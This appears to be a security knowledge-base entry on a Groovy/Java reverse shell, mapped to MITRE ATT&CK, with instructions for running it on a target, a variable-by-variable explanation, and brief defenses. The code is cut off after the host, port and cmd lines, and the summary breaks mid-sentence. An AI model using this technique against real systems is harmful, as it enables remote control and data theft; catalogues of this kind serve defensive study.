---
id: 33037ce2-b247-428f-a332-e6672b4ea0b6
name: Groovy Java Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.698569+00:00'
updated_at: '2023-04-10T20:25:30.872881+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Standard Non-Application Layer Protocol|T1095 - Standard Non-Application Layer
  Protocol]]'
tags:
- '[[Groovy]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Groovy Java Reverse Shell

## Summary

The Groovy Java Reverse Shell is a technique that allows an attacker to establish a command and control channel from a compromised system to an external network. This technique uses the Groovy language to execute a Java reverse shell payload. The payload connects back to the attacker's system and p

## Description

# Description

The Groovy Java Reverse Shell is a technique that allows an attacker to establish a command and control channel from a compromised system to an external network. This technique uses the Groovy language to execute a Java reverse shell payload. The payload connects back to the attacker's system and provides a shell session with the same privileges as the compromised system. This technique can be used to bypass network security controls and exfiltrate data from the compromised system.

## Requirements

1. Access to a compromised system with the Groovy language installed

1. Ability to execute the Java reverse shell payload

## Defense

1. Implement network segmentation to prevent lateral movement

1. Monitor network traffic for unusual connections and data exfiltration

1. Use endpoint detection and response (EDR) solutions to detect and respond to suspicious activity

## Objectives

1. Establish a command and control channel from a compromised system to an external network

1. Execute commands on the compromised system

1. Exfiltrate data from the compromised system

# Instructions

1. This command allows you to create a reverse shell connection from the target machine back to your machine. To use this command, you will need to modify the `host` and `port` variables in the code to match your IP and port. Once the code is modified, compile and run it on the target machine. This will establish a connection back to your machine, providing you with a shell on the target machine that you can use to execute commands.

**Code**: [[String host="10.0.0.1";
int port=4242;
String cmd=]]

> - `host`: The IP address of the machine that the reverse shell should connect back to.
- `port`: The port number that the reverse shell should connect back to.
- `cmd`: The name of the command that should be executed on the target machine to establish the reverse shell connection.
- `p`: A process object that represents the command being executed on the target machine.
- `s`: A socket object that represents the connection between the target machine and the machine that the reverse shell is connecting back to.
- `pi`: An input stream object that represents the standard output of the command being executed on the target machine.
- `pe`: An input stream object that represents the standard error output of the command being executed on the target machine.
- `si`: An input stream object that represents the input stream of the socket connection between the target machine and the machine that the reverse shell is connecting back to.
- `po`: An output stream object that represents the output stream of the command being executed on the target machine.
- `so`: An output stream object that represents the output stream of the socket connection between the target machine and the machine that the reverse shell is connecting back to.
- `Thread.sleep(50)`: The amount of time in milliseconds that the thread should sleep before checking if the socket connection has been closed.
- `p.exitValue()`: The exit value of the command being executed on the target machine. If this value is non-zero, it indicates that the command failed to execute or terminated abnormally.
- `p.destroy()`: Terminates the command being executed on the target machine.
- `s.close()`: Closes the socket connection between the target machine and the machine that the reverse shell is connecting back to.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Standard Non-Application Layer Protocol|T1095 - Standard Non-Application Layer Protocol]]

## Tags

- [[Groovy]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
